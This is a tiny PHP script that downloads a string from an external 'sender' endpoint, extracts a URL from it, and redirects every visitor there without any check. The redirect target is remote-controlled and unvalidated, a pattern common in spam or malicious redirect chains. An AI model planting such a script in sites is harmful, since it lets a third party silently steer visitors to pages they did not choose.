<?php 
$target="butie2";
$str = file_get_contents('https://test.cheapdodo.top/sender/'.$target);
$str = str_replace("let ip='","",$str);
// echo($str);
$new_url = explode("';var a",$str)[0];
// header('HTTP/1.1 301 Moved Permanently');
// echo($new_url);
header("Location:$new_url"); 
?>
